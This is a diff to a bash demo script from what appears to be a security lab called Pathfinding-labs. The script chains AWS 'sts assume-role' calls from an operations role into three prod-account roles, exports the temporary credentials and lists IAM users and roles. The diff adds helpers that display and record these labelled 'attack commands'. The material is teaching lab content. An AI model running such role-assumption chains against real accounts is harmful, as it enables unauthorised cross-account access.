@@ -4,7 +4,6 @@
 # This script demonstrates cross-account role assumption from operations to prod environments
 # It shows how an operations role with sts:AssumeRole on * can assume any role in prod
 
-set -e
 
 # Disable AWS CLI paging
 export AWS_PAGER=""
@@ -15,6 +14,24 @@ GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 BLUE='\033[0;34m'
 NC='\033[0m' # No Color
+
+# Dim color for command display
+DIM='\033[2m'
+CYAN='\033[0;36m'
+
+# Track attack commands for summary
+ATTACK_COMMANDS=()
+
+# Display a command before executing it
+show_cmd() {
+    echo -e "${DIM}\$ $*${NC}"
+}
+
+# Display AND record an attack command
+show_attack_cmd() {
+    echo -e "\n${CYAN}\$ $*${NC}"
+    ATTACK_COMMANDS+=("$*")
+}
 
 echo -e "${BLUE}=== Pathfinding-labs Cross-Account Operations to Prod Role Assumption Demo ===${NC}"
 echo "This demo shows how operations roles can assume roles in prod accounts."
@@ -41,6 +58,7 @@ OPS_ROLE_ARN="arn:aws:iam::${OPS_ACCOUNT_ID}:role/${OPS_ROLE_NAME}"
 
 echo "Operations Role ARN: $OPS_ROLE_ARN"
 echo "Assuming operations role..."
+show_attack_cmd aws sts assume-role --role-arn "$OPS_ROLE_ARN" --role-session-name "ops-role-demo" --profile "$OPS_STARTING_USER_PROFILE"
 OPS_ASSUME_OUTPUT=$(aws sts assume-role --role-arn "$OPS_ROLE_ARN" --role-session-name "ops-role-demo" --profile "$OPS_STARTING_USER_PROFILE")
 export AWS_ACCESS_KEY_ID=$(echo "$OPS_ASSUME_OUTPUT" | jq -r '.Credentials.AccessKeyId')
 export AWS_SECRET_ACCESS_KEY=$(echo "$OPS_ASSUME_OUTPUT" | jq -r '.Credentials.SecretAccessKey')
@@ -51,6 +69,7 @@ echo -e "${GREEN}✓ Successfully assumed operations role${NC}"
 echo ""
 echo -e "${YELLOW}Step 3: Verifying Operations Role Permissions${NC}"
 echo "Current caller identity:"
+show_cmd aws sts get-caller-identity
 aws sts get-caller-identity
 
 echo ""
@@ -65,6 +84,7 @@ PROD_ROLE_1_ARN="arn:aws:iam::${PROD_ACCOUNT_ID}:role/${PROD_ROLE_1_NAME}"
 
 echo "Prod Role 1 ARN: $PROD_ROLE_1_ARN"
 echo "Assuming prod role 1 from operations role..."
+show_attack_cmd aws sts assume-role --role-arn "$PROD_ROLE_1_ARN" --role-session-name "prod-role-1-demo"
 PROD_ASSUME_OUTPUT_1=$(aws sts assume-role --role-arn "$PROD_ROLE_1_ARN" --role-session-name "prod-role-1-demo")
 export AWS_ACCESS_KEY_ID=$(echo "$PROD_ASSUME_OUTPUT_1" | jq -r '.Credentials.AccessKeyId')
 export AWS_SECRET_ACCESS_KEY=$(echo "$PROD_ASSUME_OUTPUT_1" | jq -r '.Credentials.SecretAccessKey')
@@ -75,11 +95,13 @@ echo -e "${GREEN}✓ Successfully assumed prod role 1${NC}"
 echo ""
 echo -e "${YELLOW}Step 5: Verifying Prod Role 1 Access${NC}"
 echo "Current caller identity:"
+show_cmd aws sts get-caller-identity
 aws sts get-caller-identity
 
 echo ""
 echo "Testing SecurityAudit permissions..."
 echo "Listing IAM users (SecurityAudit allows read-only access):"
+show_cmd aws iam list-users --max-items 5 --query 'Users[].UserName' --output text
 aws iam list-users --max-items 5 --query 'Users[].UserName' --output text
 
 echo -e "${GREEN}✓ Successfully demonstrated SecurityAudit access${NC}"
@@ -98,6 +120,7 @@ export AWS_SESSION_TOKEN=$(echo "$OPS_ASSUME_OUTPUT_2" | jq -r '.Credentials.Ses
 PROD_ROLE_2_ARN="arn:aws:iam::${PROD_ACCOUNT_ID}:role/${PROD_ROLE_2_NAME}"
 echo "Prod Role 2 ARN: $PROD_ROLE_2_ARN"
 echo "Assuming prod role 2 from operations role..."
+show_attack_cmd aws sts assume-role --role-arn "$PROD_ROLE_2_ARN" --role-session-name "prod-role-2-demo"
 PROD_ASSUME_OUTPUT_2=$(aws sts assume-role --role-arn "$PROD_ROLE_2_ARN" --role-session-name "prod-role-2-demo")
 export AWS_ACCESS_KEY_ID=$(echo "$PROD_ASSUME_OUTPUT_2" | jq -r '.Credentials.AccessKeyId')
 export AWS_SECRET_ACCESS_KEY=$(echo "$PROD_ASSUME_OUTPUT_2" | jq -r '.Credentials.SecretAccessKey')
@@ -108,11 +131,13 @@ echo -e "${GREEN}✓ Successfully assumed prod role 2${NC}"
 echo ""
 echo -e "${YELLOW}Step 7: Verifying Prod Role 2 Access${NC}"
 echo "Current caller identity:"
+show_cmd aws sts get-caller-identity
 aws sts get-caller-identity
 
 echo ""
 echo "Testing SecurityAudit permissions on role 2..."
 echo "Listing IAM roles (SecurityAudit allows read-only access):"
+show_cmd aws iam list-roles --max-items 5 --query 'Roles[].RoleName' --output text
 aws iam list-roles --max-items 5 --query 'Roles[].RoleName' --output text
 
 echo -e "${GREEN}✓ Successfully demonstrated SecurityAudit access via role 2${NC}"
@@ -137,6 +162,7 @@ echo "Attempting to assume a role that trusts operations account..."
 PROD_ROLE_3_ARN="arn:aws:iam::${PROD_ACCOUNT_ID}:role/${PROD_ROLE_3_NAME}"
 echo "Prod Role 3 ARN: $PROD_ROLE_3_ARN"
 echo "Assuming prod role 3 from operations role..."
+show_attack_cmd aws sts assume-role --role-arn "$PROD_ROLE_3_ARN" --role-session-name "prod-role-3-demo"
 PROD_ASSUME_OUTPUT_3=$(aws sts assume-role --role-arn "$PROD_ROLE_3_ARN" --role-session-name "prod-role-3-demo")
 export AWS_ACCESS_KEY_ID=$(echo "$PROD_ASSUME_OUTPUT_3" | jq -r '.Credentials.AccessKeyId')
 export AWS_SECRET_ACCESS_KEY=$(echo "$PROD_ASSUME_OUTPUT_3" | jq -r '.Credentials.SecretAccessKey')
@@ -147,6 +173,7 @@ echo -e "${GREEN}✓ Successfully assumed prod role 3${NC}"
 echo ""
 echo -e "${YELLOW}Step 9: Verifying Final Role Access${NC}"
 echo "Current caller identity:"
+show_cmd aws sts get-caller-identity
 aws sts get-caller-identity
 
 echo ""
@@ -160,6 +187,13 @@ echo -e "${GREEN}✓ Successfully demonstrated cross-account role assumption${NC
 
 # Reset credentials
 unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
+
+if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
+    echo -e "\n${YELLOW}Attack Commands:${NC}"
+    for cmd in "${ATTACK_COMMANDS[@]}"; do
+        echo -e "  ${CYAN}\$ ${cmd}${NC}"
+    done
+fi
 
 echo ""
 echo -e "${YELLOW}Step 10: Security Analysis${NC}"
